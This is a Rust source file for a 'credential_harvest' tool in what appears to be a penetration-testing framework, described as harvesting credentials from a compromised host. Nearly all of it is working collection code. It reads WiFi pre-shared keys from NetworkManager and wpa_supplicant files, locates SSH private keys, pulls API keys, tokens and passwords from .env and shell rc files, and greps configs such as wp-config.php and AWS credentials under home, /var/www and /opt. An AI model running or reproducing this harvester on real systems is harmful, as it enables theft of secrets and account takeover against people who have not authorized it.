//! Credential harvesting tool - extract credentials from compromised hosts

use async_trait::async_trait;
use pentest_core::error::{Error, Result};
use pentest_core::tools::*;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::path::{Path, PathBuf};
use tokio::fs;
use tokio::process::Command;

/// Credential harvesting results
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CredentialHarvest {
    pub browser_passwords: Vec<BrowserCredential>,
    pub wifi_passwords: Vec<WifiCredential>,
    pub ssh_keys: Vec<SshKey>,
    pub environment_secrets: Vec<EnvSecret>,
    pub config_files: Vec<ConfigFile>,
    pub total_found: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BrowserCredential {
    pub browser: String,
    pub url: String,
    pub username: String,
    pub password: String, // Would be encrypted in production
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiCredential {
    pub ssid: String,
    pub password: String,
    pub auth_type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SshKey {
    pub path: String,
    pub key_type: String,
    pub fingerprint: String,
    pub has_passphrase: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvSecret {
    pub variable: String,
    pub value: String,
    pub source: String, // .env, .bashrc, etc.
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConfigFile {
    pub path: String,
    pub file_type: String, // database config, API keys, etc.
    pub secrets_found: Vec<String>,
}

/// Credential harvesting tool
pub struct CredentialHarvestTool;

impl CredentialHarvestTool {
    /// Extract WiFi passwords (Linux)
    async fn harvest_wifi_linux() -> Result<Vec<WifiCredential>> {
        let mut creds = Vec::new();

        // NetworkManager connections
        let nm_dir = PathBuf::from("/etc/NetworkManager/system-connections");
        if nm_dir.exists() {
            if let Ok(mut entries) = fs::read_dir(&nm_dir).await {
                while let Ok(Some(entry)) = entries.next_entry().await {
                    if let Ok(content) = fs::read_to_string(entry.path()).await {
                        if let Some(ssid) = Self::extract_value(&content, "ssid=") {
                            if let Some(psk) = Self::extract_value(&content, "psk=") {
                                creds.push(WifiCredential {
                                    ssid,
                                    password: psk,
                                    auth_type: "WPA-PSK".to_string(),
                                });
                            }
                        }
                    }
                }
            }
        }

        // wpa_supplicant
        let wpa_conf = PathBuf::from("/etc/wpa_supplicant/wpa_supplicant.conf");
        if wpa_conf.exists() {
            if let Ok(content) = fs::read_to_string(&wpa_conf).await {
                // Parse wpa_supplicant.conf format
                let mut current_ssid = None;
                for line in content.lines() {
                    let line = line.trim();
                    if let Some(stripped) = line.strip_prefix("ssid=") {
                        current_ssid = Some(stripped.trim_matches('"').to_string());
                    } else if let Some(stripped) = line.strip_prefix("psk=") {
                        if let Some(ssid) = current_ssid.take() {
                            creds.push(WifiCredential {
                                ssid,
                                password: stripped.trim_matches('"').to_string(),
                                auth_type: "WPA-PSK".to_string(),
                            });
                        }
                    }
                }
            }
        }

        Ok(creds)
    }

    /// Extract SSH keys
    async fn harvest_ssh_keys() -> Result<Vec<SshKey>> {
        let mut keys = Vec::new();

        // Check common locations
        let ssh_dir = PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| "/root".to_string()))
            .join(".ssh");

        if ssh_dir.exists() {
            let key_files = ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"];
            for key_file in &key_files {
                let key_path = ssh_dir.join(key_file);
                if key_path.exists() {
                    if let Ok(content) = fs::read_to_string(&key_path).await {
                        let has_passphrase = content.contains("ENCRYPTED");
                        let key_type = if key_file.contains("rsa") {
                            "RSA"
                        } else if key_file.contains("ed25519") {
                            "Ed25519"
                        } else if key_file.contains("ecdsa") {
                            "ECDSA"
                        } else {
                            "DSA"
                        };

                        // Get fingerprint
                        let fingerprint = Self::get_ssh_fingerprint(&key_path)
                            .await
                            .unwrap_or_else(|_| "unknown".to_string());

                        keys.push(SshKey {
                            path: key_path.to_string_lossy().to_string(),
                            key_type: key_type.to_string(),
                            fingerprint,
                            has_passphrase,
                        });
                    }
                }
            }
        }

        Ok(keys)
    }

    /// Get SSH key fingerprint
    async fn get_ssh_fingerprint(key_path: &Path) -> Result<String> {
        let output = Command::new("ssh-keygen")
            .args(["-lf", key_path.to_str().unwrap()])
            .output()
            .await
            .map_err(|e| Error::ToolExecution(format!("ssh-keygen failed: {}", e)))?;

        if output.status.success() {
            let stdout = String::from_utf8_lossy(&output.stdout);
            Ok(stdout
                .split_whitespace()
                .nth(1)
                .unwrap_or("unknown")
                .to_string())
        } else {
            Ok("unable_to_read".to_string())
        }
    }

    /// Extract environment secrets
    async fn harvest_env_secrets() -> Result<Vec<EnvSecret>> {
        let mut secrets = Vec::new();

        // Common environment files
        let env_files = [
            ".env",
            ".env.local",
            ".env.production",
            ".bashrc",
            ".zshrc",
            ".profile",
        ];

        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());

        for env_file in &env_files {
            let path = PathBuf::from(&home).join(env_file);
            if path.exists() {
                if let Ok(content) = fs::read_to_string(&path).await {
                    for line in content.lines() {
                        let line = line.trim();
                        if line.contains("=") && !line.starts_with('#') {
                            // Look for secrets (API keys, passwords, tokens)
                            let lower = line.to_lowercase();
                            if lower.contains("api")
                                || lower.contains("key")
                                || lower.contains("secret")
                                || lower.contains("password")
                                || lower.contains("token")
                                || lower.contains("credential")
                            {
                                if let Some((var, val)) = line.split_once('=') {
                                    secrets.push(EnvSecret {
                                        variable: var.trim().to_string(),
                                        value: val.trim().trim_matches('"').to_string(),
                                        source: env_file.to_string(),
                                    });
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(secrets)
    }

    /// Find configuration files with credentials
    async fn harvest_config_files() -> Result<Vec<ConfigFile>> {
        let mut configs = Vec::new();

        // Common config file patterns
        let patterns = [
            ("config.php", "PHP Config"),
            ("wp-config.php", "WordPress"),
            ("settings.py", "Django/Python"),
            ("database.yml", "Rails"),
            ("config.json", "JSON Config"),
            (".npmrc", "NPM Config"),
            (".dockercfg", "Docker Config"),
            ("credentials", "AWS Credentials"),
        ];

        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
        let search_dirs = vec![
            PathBuf::from(&home),
            PathBuf::from("/var/www"),
            PathBuf::from("/opt"),
        ];

        for search_dir in search_dirs {
            if !search_dir.exists() {
                continue;
            }

            for (pattern, file_type) in &patterns {
                // Use find command for efficiency
                if let Ok(output) = Command::new("find")
                    .args([
                        search_dir.to_str().unwrap(),
                        "-name",
                        pattern,
                        "-type",
                        "f",
                        "-readable",
                    ])
                    .output()
                    .await
                {
                    let files = String::from_utf8_lossy(&output.stdout);
                    for file_path in files.lines().take(10) {
                        // Limit to 10 per pattern
                        if let Ok(content) = fs::read_to_string(file_path).await {
                            let mut secrets = Vec::new();
                            for line in content.lines().take(100) {
                                // First 100 lines
                                let lower = line.to_lowercase();
                                if (lower.contains("password")
                                    || lower.contains("secret")
                                    || lower.contains("key")
                                    || lower.contains("token"))
                                    && line.contains('=')
                                {
                                    secrets.push(line.to_string());
                                }
                            }

                            if !secrets.is_empty() {
                                configs.push(ConfigFile {
                                    path: file_path.to_string(),
                                    file_type: file_type.to_string(),
                                    secrets_found: secrets,
                                });
                            }
                        }
                    }
                }
            }
        }

        Ok(configs)
    }

    /// Helper to extract value from key=value format
    fn extract_value(content: &str, key: &str) -> Option<String> {
        for line in content.lines() {
            if line.trim().starts_with(key) {
                return Some(line[key.len()..].trim().trim_matches('"').to_string());
            }
        }
        None
    }
}

#[async_trait]
impl PentestTool for CredentialHarvestTool {
    fn name(&self) -> &str {
        "credential_harvest"
    }

    fn description(&self) -> &str {
        "Harvest credentials from compromised host (WiFi passwords, SSH keys, environment secrets, config files)"
    }

    fn schema(&self) -> ToolSchema {
        ToolSchema::new(self.name(), self.description()).param(ToolParam::optional(
            "targets",
            ParamType::String,
            "Comma-separated harvest targets: wifi,ssh,env,configs (default: all)",
            json!("all"),
        ))
    }

    fn supported_platforms(&self) -> Vec<Platform> {
        vec![Platform::Desktop, Platform::Android, Platform::Tui]
    }

    async fn execute(&self, params: Value, _ctx: &ToolContext) -> Result<ToolResult> {
        execute_timed(|| async {
            let targets = params["targets"].as_str().unwrap_or("all").to_lowercase();

            tracing::info!("═══════════════════════════════════════════════════");
            tracing::info!("🔑 Credential Harvesting Started");
            tracing::info!("═══════════════════════════════════════════════════");

            let harvest_all = targets == "all";

            // Harvest WiFi passwords
            let wifi_passwords = if harvest_all || targets.contains("wifi") {
                tracing::info!("📡 Harvesting WiFi credentials...");
                Self::harvest_wifi_linux().await.unwrap_or_default()
            } else {
                Vec::new()
            };

            // Harvest SSH keys
            let ssh_keys = if harvest_all || targets.contains("ssh") {
                tracing::info!("🔐 Harvesting SSH keys...");
                Self::harvest_ssh_keys().await.unwrap_or_default()
            } else {
                Vec::new()
            };

            // Harvest environment secrets
            let env_secrets = if harvest_all || targets.contains("env") {
                tracing::info!("🌍 Harvesting environment secrets...");
                Self::harvest_env_secrets().await.unwrap_or_default()
            } else {
                Vec::new()
            };

            // Harvest config files
            let config_files = if harvest_all || targets.contains("config") {
                tracing::info!("📄 Harvesting configuration files...");
                Self::harvest_config_files().await.unwrap_or_default()
            } else {
                Vec::new()
            };

            let total_found =
                wifi_passwords.len() + ssh_keys.len() + env_secrets.len() + config_files.len();

            tracing::info!("");
            tracing::info!("Harvest Complete:");
            tracing::info!("  WiFi Passwords:    {}", wifi_passwords.len());
            tracing::info!("  SSH Keys:          {}", ssh_keys.len());
            tracing::info!("  Env Secrets:       {}", env_secrets.len());
            tracing::info!("  Config Files:      {}", config_files.len());
            tracing::info!("  Total:             {}", total_found);
            tracing::info!("═══════════════════════════════════════════════════");

            let harvest = CredentialHarvest {
                browser_passwords: Vec::new(), // Browser harvest requires more complex implementation
                wifi_passwords,
                ssh_keys,
                environment_secrets: env_secrets,
                config_files,
                total_found,
            };

            Ok(json!(harvest))
        })
        .await
    }
}
